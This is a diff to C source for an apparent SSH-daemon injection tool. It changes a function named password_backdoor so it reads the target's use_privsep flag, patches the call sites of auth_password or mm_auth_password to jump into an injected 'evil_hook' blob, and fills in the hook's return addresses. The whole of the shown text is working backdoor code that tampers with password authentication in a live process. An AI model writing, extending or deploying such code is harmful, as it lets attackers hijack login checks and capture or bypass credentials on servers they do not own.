@@ -175,9 +175,10 @@ void password_backdoor(inject_ctx *ctx) {
 	u64 use_privsep=0, logit_passchange=0, privsep_load=0, privsep_test=0;
 	u64 auth_password=0, mm_auth_password=0;
 	u64 *auth_password_calls = NULL, *mm_auth_password_calls = NULL;
-	int i, n_auth_password_calls, n_mm_auth_password_calls;
+	int i, j, n_auth_password_calls, n_mm_auth_password_calls;
 	u64 diff=0, hole_addr=0;
 	u8 *evil_bin;
+	u32 use_privsep_val=0;
 	
 	evil_bin = malloc(evil_hook_size);
 	memcpy(evil_bin, evil_hook, evil_hook_size);
@@ -264,31 +265,53 @@ void password_backdoor(inject_ctx *ctx) {
 		MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
 		0, 0
 	);
+
+	_peek(ctx->pid, use_privsep, &use_privsep_val, 4);
 	
-	for (i = 0; i < n_auth_password_calls; i++) {
-		diff = 0x100000000-(auth_password_calls[i]-hole_addr)-5;
+	if (use_privsep_val) {
+		// Patch mm_auth_password
+		for (i = 0; i < n_mm_auth_password_calls; i++) {
+			diff = 0x100000000-(mm_auth_password_calls[i]-hole_addr)-5;
 
-		info(
-			"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
-			auth_password_calls[i], hole_addr,
-			diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
-		);
+			info(
+				"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
+				mm_auth_password_calls[i], hole_addr,
+				diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
+			);
 
-		_poke(ctx->pid, auth_password_calls[i]+1, &diff, 4);
+			_poke(ctx->pid, mm_auth_password_calls[i]+1, &diff, 4);
+		}
+	} else {
+		// Patch auth_password
+		for (i = 0; i < n_auth_password_calls; i++) {
+			diff = 0x100000000-(auth_password_calls[i]-hole_addr)-5;
+
+			info(
+				"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
+				auth_password_calls[i], hole_addr,
+				diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
+			);
+
+			_poke(ctx->pid, auth_password_calls[i]+1, &diff, 4);
+		}
 	}
 	
-	for (i = 0; i < n_mm_auth_password_calls; i++) {
-		diff = 0x100000000-(mm_auth_password_calls[i]-hole_addr)-5;
-
-		info(
-			"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
-			mm_auth_password_calls[i], hole_addr,
-			diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
-		);
-
-		_poke(ctx->pid, mm_auth_password_calls[i]+1, &diff, 4);
+	// Insert return address
+	for(j = 0; j < evil_hook_size - 8; j++) {
+		u64 *vptr = (u64*)&evil_bin[j];
+		switch (*vptr) {
+			case 0x1111111122222222:
+				*vptr = use_privsep;
+				break;
+			case 0x3333333344444444:
+				*vptr = auth_password;
+				break;
+			case 0x5555555566666666:
+				*vptr = mm_auth_password;
+				break;
+		}
 	}
-	
+
 	_poke(ctx->pid, hole_addr, evil_bin, evil_hook_size);
 	info("poked evil_bin to 0x%lx.", hole_addr);
 	
